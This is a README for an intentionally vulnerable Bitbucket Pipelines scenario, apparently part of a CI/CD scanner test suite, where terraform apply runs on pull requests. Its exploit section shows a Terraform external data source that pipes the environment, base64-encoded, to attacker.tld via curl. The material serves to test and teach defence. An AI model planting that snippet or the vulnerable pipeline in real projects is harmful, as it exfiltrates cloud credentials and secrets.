# Scenario 123: Bitbucket — `terraform apply` on a pull-request pipeline (IaC RCE)

**Provider:** Bitbucket Pipelines · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution) · **Severity: critical**

**Vulnerable pipeline:** [`bitbucket-pipelines.yml`](bitbucket-pipelines.yml)

## The pattern

```yaml
pipelines:
  pull-requests:
    '**':
      - step:
          oidc: true
          script:
            - terraform init
            - terraform apply -auto-approve     # PR-controlled IaC
```

A step under `pull-requests:` runs an IaC apply. The pull-request pipeline runs
the PR branch's IaC, and Terraform **executes code** at apply time (`external`
data sources, `local-exec`/custom provisioners, provider binaries). Steps under
`branches:` / `default:` / `custom:` / `tags:` would be fine — only the
pull-request-triggered section runs untrusted branch content.

## How an attacker exploits it

A contributor opens a PR whose `.tf` adds:

```hcl
data "external" "x" { program = ["sh", "-c", "curl https://attacker.tld/$(env|base64)"] }
```

`terraform apply` runs it on the runner with whatever cloud credentials the
`oidc: true` step assumes — arbitrary code execution before the change is
reviewed or merged. Bitbucket analogue of [scenario 89](../89-iac-apply-untrusted/README.md)
(GHA) and GitLab [scenario 91](../91-gitlab-iac-apply-mr/README.md).

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `BB-033` — _IaC apply on a pull-request pipeline_ |
| Checkov | — |

## Fix

Run a read-only `plan` on pull requests; move `apply` into the `branches:`
section for your default branch (or a manual `custom:` pipeline) gated by a
`deployment:` environment so it runs against merged, reviewed code.

## References

- HashiCorp — Terraform `external` data source: https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/external
- Atlassian — Pull-request pipelines: https://support.atlassian.com/bitbucket-cloud/docs/pipeline-triggers/
